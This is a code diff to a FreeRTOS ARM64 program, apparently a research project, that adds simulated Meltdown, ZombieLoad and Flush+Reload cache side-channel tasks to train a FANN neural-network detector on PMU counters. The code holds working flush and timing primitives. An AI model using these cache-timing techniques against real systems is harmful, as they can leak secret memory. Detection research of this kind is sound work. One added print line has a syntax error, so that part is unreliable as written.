@@ -1183,6 +1183,7 @@ void task_monitor(void *arg) {
   TickType_t xLastWakeTime = xTaskGetTickCount();
   
   FANN_sample sample;
+  printf("CPU_CYCLES, INSTRUCTIONS, CACHE_MISSES, BRANCH_MISSES, LABEL\n");
 
   while(1) {
       vTaskDelayUntil(&xLastWakeTime, xPeriod);
@@ -1194,7 +1195,7 @@ void task_monitor(void *arg) {
       xQueueSend(xPmuQueue, &sample, 0);
 
       // print para ver se ta funcionando
-      printf("CPU: %lu | INST: %lu | CACHEMIS: %lu | BRANCHMIS: %lu | OUT: %.1f\n",
+      printf("%lu %lu %lu %lu %.1f\n",
               sample.data.cpu_cycles,
               sample.data.instructions,
               sample.data.cache_misses,
@@ -1290,6 +1291,8 @@ void task_attacker(void *arg) {
     // fflush(stdout);
   }
 }
+
+//SPECTRE
 
 //definiçoes necessarias para o spectre
 unsigned int array1_size = 16;
@@ -1404,6 +1407,246 @@ void task_spectre(void *arg) {
     }
 }
 
+//MELTDOWN
+
+uint8_t secret_data = 42; 
+void *kernel_address = &secret_data; 
+
+void try_meltdown_read(void *addr) {
+    unsigned long val;
+    
+
+    asm volatile (
+        "ldr %0, [%1]\n\t"        // Tenta carregar o segredo
+        "lsl %0, %0, #12\n\t"     // Multiplica por 4096
+        "ldr x2, [%2, %0]\n\t"    // Acessa array2[segredo * 4096]
+        : "=&r" (val)             // Saída
+        : "r" (addr), "r" (array2)// Entradas
+        : "x2", "memory"          // Clobbers
+    );
+}
+
+int measure_cache_meltdown(int threshold) {
+    uint64_t start, end;
+    int hit_index = -1;
+    volatile uint8_t *addr;
+
+    for (int i = 0; i < 256; i++) {
+        int mix_i = ((i * 167) + 13) & 255; // Embaralha para evitar stride prediction
+        addr = &array2[mix_i * 512]; // Usando stride 512 do seu código spectre
+
+        // Mede tempo de acesso
+        asm volatile("isb \n mrs %0, cntvct_el0" : "=r"(start));
+        volatile uint8_t junk = *addr;
+        asm volatile("isb \n mrs %0, cntvct_el0" : "=r"(end));
+
+        if ((end - start) <= threshold) {
+            hit_index = mix_i;
+        }
+    }
+    return hit_index;
+}
+
+void task_meltdown(void *arg) {
+    const TickType_t xPeriod = pdMS_TO_TICKS(1000);
+    TickType_t xLastWakeTime = xTaskGetTickCount();
+    
+    int cache_hit_threshold = 60;
+
+    // inicializa o array de prova
+    for (int i = 0; i < 256 * 512; i++) array2[i] = 1;
+
+    printf("[MELTDOWN] Iniciando Task (Simulada)...\n");
+
+    while(1) {
+        vTaskDelayUntil(&xLastWakeTime, xPeriod);
+        
+        g_label_atual = 1.0f;
+        
+        TickType_t end_attack_time = xTaskGetTickCount() + pdMS_TO_TICKS(1000);
+
+        while (xTaskGetTickCount() < end_attack_time) {
+            
+            for (int i = 0; i < 256; i++) {
+                 asm volatile("dc civac, %0" : : "r"(&array2[i * 512]) : "memory");
+            }
+            asm volatile("dsb sy \n isb");
+
+            try_meltdown_read(kernel_address); 
+            
+            volatile int result = measure_cache_meltdown(cache_hit_threshold);
+            (void)result;
+        }
+        
+        g_label_atual = 0.0f; 
+    }
+}
+
+// // //ARMAGEDDON
+
+// //area de monitoramento compartilhada para o ataque flush+reload
+// uint8_t shared_probe_data[4096] __attribute__((aligned(4096))); 
+// volatile uint8_t *target_addr = &shared_probe_data[2048];
+
+// //primitiva de flush
+// inline void arm_flush(void *addr) {
+//     asm volatile("dc civac, %0" : : "r"(addr) : "memory");
+//     asm volatile("dsb sy"); //garante que o flush terminou
+// }
+
+// //primitiva de medição de tempo usando o contador de ciclos virtual (cntvct_el0)
+// inline uint64_t arm_measure_access(void *addr) {
+//     uint64_t start, end;
+//     asm volatile("isb \n mrs %0, cntvct_el0" : "=r"(start));
+//     volatile uint8_t junk = *(volatile uint8_t *)addr;
+//     asm volatile("isb \n mrs %0, cntvct_el0" : "=r"(end));
+//     return end - start;
+// }
+
+// uint64_t calibrate_threshold() {
+//     uint64_t hit_time = 0, miss_time = 0;
+//     int samples = 1000;
+
+//     for(int i=0; i<samples; i++) {
+//         volatile uint8_t reload = *target_addr;
+//         hit_time += arm_measure_access((void*)target_addr);
+//     }
+//     hit_time /= samples;
+
+//     for(int i=0; i<samples; i++) {
+//         arm_flush((void*)target_addr);
+//         miss_time += arm_measure_access((void*)target_addr);
+//     }
+//     miss_time /= samples;
+
+//     uint64_t threshold = (hit_time + miss_time) / 2;
+//     printf("[ARMAGEDDON] Calibração: Hit=%lu, Miss=%lu, Threshold=%lu\n", hit_time, miss_time, threshold);
+//     return threshold;
+// }
+
+// void simulate_victim_access() {
+//     volatile uint8_t dummy = *target_addr;
+// }
+
+// void task_flush_reload(void *arg) {
+//     const TickType_t xPeriod = pdMS_TO_TICKS(2000); 
+//     TickType_t xLastWakeTime = xTaskGetTickCount();
+    
+//     *target_addr = 0xAA;
+    
+//     vTaskDelay(pdMS_TO_TICKS(100));
+//     uint64_t threshold = calibrate_threshold();
+    
+//     int hits = 0;
+//     int probes = 0;
+
+//     printf("[ARMAGEDDON] Iniciando Monitoramento Flush+Reload...\n");
+
+//     while(1) {
+//         vTaskDelayUntil(&xLastWakeTime, xPeriod);
+        
+//         g_label_atual = 1.0f; 
+        
+//         TickType_t end_attack = xTaskGetTickCount() + pdMS_TO_TICKS(1000);
+        
+//         hits = 0;
+//         probes = 0;
+
+//         while(xTaskGetTickCount() < end_attack) {
+//             arm_flush((void*)target_addr);
+            
+//             if ((rand() % 100) < 30) { // 30% de chance da vítima acessar
+//                 simulate_victim_access();
+//             }
+
+//             uint64_t time = arm_measure_access((void*)target_addr);
+//             probes++;
+
+//             if (time < threshold) {
+//                 hits++; //alguem acessou.
+//             }
+//         }
+
+//         // printf("[ARMAGEDDON] Stats: %d Hits em %d Probes (Ratio: %.2f)\n", hits, probes, (float)hits/probes);
+        
+//         // Período de descanso (Label 0) para o benchmark
+//         g_label_atual = 0.0f;
+//     }
+// }
+
+//ZOMBIELOAD
+
+//buffer auxiliar para gerar tráfego nos fill buffers
+#define FILL_BUFFER_SIZE (64 * 1024)
+uint8_t zombie_noise_buffer[FILL_BUFFER_SIZE];
+
+//simula a carga nos buffers de preenchimento
+void generate_mds_traffic() {
+    for (int i = 0; i < 100; i++) {
+        int idx = rand() % FILL_BUFFER_SIZE;
+        zombie_noise_buffer[idx] += 1;
+        //força a escrita e invalidaçao para gerar trafego de barramento
+        asm volatile("dc civac, %0" : : "r"(&zombie_noise_buffer[idx]) : "memory");
+    }
+    asm volatile("dsb sy");
+}
+
+void task_zombieload(void *arg) {
+    const TickType_t xPeriod = pdMS_TO_TICKS(1000); 
+    TickType_t xLastWakeTime = xTaskGetTickCount();
+    
+    uint8_t secret_val = 88;
+    int cache_hit_threshold = 60;
+
+    //inicializa o array de prova
+    for (int i = 0; i < 256 * 512; i++) array2[i] = 1;
+
+    printf("[ZOMBIELOAD] Iniciando Task (Simulacao de MDS Traffic)...\n");
+
+    while(1) {
+        vTaskDelayUntil(&xLastWakeTime, xPeriod);
+        
+        g_label_atual = 1.0f;
+        
+        TickType_t end_attack_time = xTaskGetTickCount() + pdMS_TO_TICKS(1000);
+
+        //loop para garantir captura pelo monitor
+        while (xTaskGetTickCount() < end_attack_time) {
+            
+            generate_mds_traffic();
+
+            //flush
+            for (int i = 0; i < 256; i++) {
+                 asm volatile("dc civac, %0" : : "r"(&array2[i * 512]) : "memory");
+            }
+            asm volatile("dsb sy \n isb");
+
+            //acesso especulativo simulado
+            volatile uint8_t dummy = array2[secret_val * 512];
+            (void)dummy;
+
+            int mix_i;
+            uint64_t start, end;
+            volatile uint8_t *addr;
+            
+            for (int i = 0; i < 256; i++) {
+                mix_i = ((i * 167) + 13) & 255;
+                addr = &array2[mix_i * 512];
+
+                asm volatile("isb \n mrs %0, cntvct_el0" : "=r"(start));
+                volatile uint8_t junk = *addr;
+                asm volatile("isb \n mrs %0, cntvct_el0" : "=r"(end));
+
+                if ((end - start) <= cache_hit_threshold) {
+                    // Hit
+                }
+            }
+        }
+        
+        g_label_atual = 0.0f; 
+    }
+}
+
 void task_random(void* arg) {
   info_t *info = (info_t *)arg;
 
@@ -1509,61 +1752,76 @@ struct fann_train_data* cria_dataset(unsigned int num_amostras) {
 void task_fann(void *arg) {
     const unsigned int num_input = TOTAL_INPUTS;
     const unsigned int num_output = 1;
-    const unsigned int num_layers = 3;
-    const unsigned int num_neurons_hidden = 10;
-    const float desired_error = 0.001f;
-    const unsigned int max_epochs = 500000;
-    const unsigned int epochs_between_reports = 100;
     
-    struct fann *ann = fann_create_standard(num_layers, num_input, num_neurons_hidden, num_output);
-    fann_set_activation_function_hidden(ann, FANN_SIGMOID);
+    const unsigned int num_layers = 4; 
+    const unsigned int num_neurons_hidden1 = 12; //camada 1 um pouco maior
+    const unsigned int num_neurons_hidden2 = 8;  //camada 2 para refinar
+    
+    //cria a rede
+    struct fann *ann = fann_create_standard(num_layers, num_input, num_neurons_hidden1, num_neurons_hidden2, num_output);
+
+    //ativacao
+    fann_set_activation_function_hidden(ann, FANN_SIGMOID_SYMMETRIC);
     fann_set_activation_function_output(ann, FANN_SIGMOID);
 
+    //treinamento incremental para ajustes suaves
+    fann_set_training_algorithm(ann, FANN_TRAIN_INCREMENTAL);
+    //taxa de aprendizado baixa para evitar mudanças bruscas
+    fann_set_learning_rate(ann, 0.01f); 
+
+    //carrega pesos pretreinados
     #ifdef NUM_PESOS
     struct fann_connection *conexoes = (struct fann_connection *)malloc(NUM_PESOS * sizeof(struct fann_connection));
+
     if (conexoes) {
-        fann_get_connection_array(ann, conexoes);
-        if (NUM_PESOS == fann_get_total_connections(ann)) {
-             for(int i=0; i<NUM_PESOS; i++) conexoes[i].weight = (fann_type)pesos_iniciais[i];
-             fann_set_weight_array(ann, conexoes, NUM_PESOS);
-             printf("[FANN] Pesos carregados com sucesso!\n");
-        }
-        free(conexoes);
+      fann_get_connection_array(ann, conexoes);
+      if (NUM_PESOS == fann_get_total_connections(ann)) {
+        for (int i=0; i<NUM_PESOS; i++) conexoes[i].weight = (fann_type)pesos_iniciais[i];
+
+        fann_set_weight_array(ann, conexoes, NUM_PESOS);
+        printf("[FANN] Pesos carregados com sucesso!\n")
+      }
+      free(conexoes);
     }
     #endif
     
     vTaskDelay(pdMS_TO_TICKS(1000));
-    const TickType_t xPeriod = pdMS_TO_TICKS(2000);
+    const TickType_t xPeriod = pdMS_TO_TICKS(2000); // 2 segundos
     TickType_t xLastWakeTime = xTaskGetTickCount();
     
     int iteracao = 0;
+    
+    printf("[FANN] Iniciando Treinamento Online (Incremental)...\n");
+
     while(1) {
       vTaskDelayUntil(&xLastWakeTime, xPeriod);
       
       int amostras = uxQueueMessagesWaiting(xPmuQueue);
+      
+      //processa apenas se tiver dados suficientes para um batch minimo
       if (amostras > 0) {
           struct fann_train_data *train_data = cria_dataset(amostras);
           
           if (train_data) {
+            
+            float erro_medio_batch = 0.0f;
             float predicao_media = 0.0f;
-            for(int k=0; k < train_data->num_data; k++) {
-                
-                if (k==0 && iteracao % 10 == 0) {
-                    printf("INPUT[0..3]: %.2f %.2f %.2f %.2f\n", 
-                           train_data->input[k][0], train_data->input[k][1], 
-                           train_data->input[k][2], train_data->input[k][3]);
-                }
 
+            for(int k=0; k < train_data->num_data; k++) {
                 fann_type *out = fann_run(ann, train_data->input[k]);
                 predicao_media += out[0];
+                
+                float erro = fabsf(train_data->output[k][0] - out[0]);
+                erro_medio_batch += erro;
             }
-            // predicao_media /= train_data->num_data;
+            predicao_media /= train_data->num_data;
+            erro_medio_batch /= train_data->num_data;
 
-            printf("FANN #%d: Real=%.0f Predito=%.2f\n", 
-                   iteracao++, train_data->output[0][0], predicao_media);
+            printf("FANN #%d: Real=%.0f Predito=%.2f (Erro Médio: %.4f)\n", 
+                   iteracao++, train_data->output[0][0], predicao_media, erro_medio_batch);
 
-            if (fabsf(train_data->output[0][0] - predicao_media) > 0.5f) {
-                fann_train_on_data(ann, train_data, max_epochs, epochs_between_reports, desired_error); 
+            if (erro_medio_batch > 0.1f) {
+                 fann_train_epoch(ann, train_data);
             }
 
             fann_destroy_train(train_data);
@@ -1629,21 +1887,21 @@ int main(void) {
   //   NULL
   // );
   
-  info_t *info_bench = benchmark_add_info(benchmark, VM_NUM, 0, PERIOD_MS_TASK_ANY);
+  info_t *info_bench = benchmark_add_info(benchmark, VM_NUM, 2, PERIOD_MS_TASK_ANY);
 
   //inicializa array2 para o ataque spectre
   for (int i = 0; i < (int)sizeof(array2); i++) {
         array2[i] = 1; 
     }
 
-  xTaskCreate(
-    task_random,
-    "taskRandom",
-    TASK_STACK_SIZE,
-    info_bench,
-    OTHER_TASK_PRIORITY,
-    NULL
-  );
+  // xTaskCreate(
+  //   task_random,
+  //   "taskRandom",
+  //   TASK_STACK_SIZE,
+  //   info_bench,
+  //   OTHER_TASK_PRIORITY,
+  //   NULL
+  // );
 
 
   // xTaskCreate(
@@ -1655,6 +1913,32 @@ int main(void) {
   //   NULL
   // );
 
+  // xTaskCreate(
+  //   task_meltdown,
+  //   "taskMeltdown",
+  //   TASK_STACK_SIZE,
+  //   NULL,
+  //   OTHER_TASK_PRIORITY,
+  //   NULL
+  // );
+
+  xTaskCreate(
+    task_zombieload,
+    "taskZombieload",
+    TASK_STACK_SIZE,
+    NULL,
+    OTHER_TASK_PRIORITY,
+    NULL
+  );
+
+  // xTaskCreate(
+  //   task_flush_reload,
+  //   "taskFlushReload",
+  //   TASK_STACK_SIZE,
+  //   NULL,
+  //   OTHER_TASK_PRIORITY,
+  //   NULL
+  // );
 
   // xTaskCreate(
   //   task_benchmark,
